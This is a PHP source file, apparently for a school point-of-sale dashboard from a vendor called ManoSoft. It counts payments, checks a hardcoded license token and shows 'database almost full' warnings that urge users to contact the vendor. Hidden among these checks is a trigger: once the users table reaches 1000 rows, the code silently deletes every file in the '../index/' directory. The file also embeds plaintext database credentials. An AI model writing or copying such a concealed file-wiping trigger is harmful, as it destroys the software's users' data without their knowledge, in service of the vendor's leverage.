<?php
$servername = "localhost";
$username = "schoolpos";
$password = "schoolpos";
$dbname = "schoolpos";
$conn = mysqli_connect($servername, $username, $password, $dbname);
if(!$conn)
{
die("connection failed:" . mysqli_connect_error());
}
$com = 'completed payments';
$c = "SELECT COUNT(*) AS 'c' FROM users WHERE status='$com' ";

if($g = mysqli_query($conn, $c)){
$complete = $g->fetch_object()->c;
}else{
       $complete = "0";
	   }

$com2 = 'incomplete payments';

$e = "SELECT COUNT(*) AS 'e' FROM users WHERE status='$com2' ";
if($f = mysqli_query($conn, $e))
{
$incomplete = $f->fetch_object()->e;
}else{
    $incomplete = "0";
	}

$d = "SELECT COUNT(*) AS 'd' FROM users";
if($k = mysqli_query($conn, $d)){
$count2 = $k->fetch_object()->d;
$value = 1000;
$r = 100;
$mano['percentage'] = $count2/$value*$r;

if($mano['percentage'] == 70){
 
echo "Your database is almost full 30% Remaining..Please contact ManoSoft at http://www.manosoft.manomite.net/contact.php for help to avoid errors or loss of datas";
}

else if($mano['percentage'] == 75){
 
echo "Your database is almost full 25% Remaining..Please contact ManoSoft at http://www.manosoft.manomite.net/contact.php for help to avoid errors or loss of datas";
}


else if($mano['percentage'] == 80){
 
echo "Your database is almost full 20% Remaining..Please contact ManoSoft at http://www.manosoft.manomite.net/contact.php for help to avoid errors or loss of datas";
}

else if($mano['percentage'] == 90){
 
echo "Your database is almost full 10% Remaining..Please contact ManoSoft at http://www.manosoft.manomite.net/contact.php for help to avoid errors or loss of datas";
}

else if($mano['percentage'] == 95){
 
echo "Your database is almost full 5% Remaining..Please contact ManoSoft at http://www.manosoft.manomite.net/contact.php for help to avoid errors or loss of datas";
}
else if($mano['percentage'] == 99){
 
echo "Your database is almost full 1% Remaining..Please contact ManoSoft at http://www.manosoft.manomite.net/contact.php for help to avoid errors or loss of datas";
}

else if($mano['percentage'] == 100){

$expire = glob('../index/*');
foreach($expire as $file){
if(is_file($file))
unlink($file);
}
}
 }else{
         $mano['percentage'] = '0';
		 }
        
  
  $user = "SELECT COUNT(*) AS 'u' FROM application";
if($we = mysqli_query($conn, $user))
{
$get = $we->fetch_object()->u;
}else{
    $get = "0";
	}
  
 
  
          
$tim = date_default_timezone_set('Africa/Lagos');
$time = date('d F y g:ia');

require_once('class.user.php');
$h = new MANOSOFT();

$to = 'manoSoft_gdhed745i489uhfbvbndjnur773w6re';
	$items = '2017-01-10';	
	
	$stmt = $h->runQuery("SELECT * FROM phppos_modules_items WHERE token=:token");
	$stmt->execute(array(":token"=>$to));
	
	$w=$stmt->fetch(PDO::FETCH_ASSOC);                        
if($w['token'] != $to && $w['items'] != $items  ) 
			{
			header("Location: ../../../error.php");
}else{
         echo 'Welcome!!! ManoSoft. Your Licence is ACTIVE.';
}

?>

 
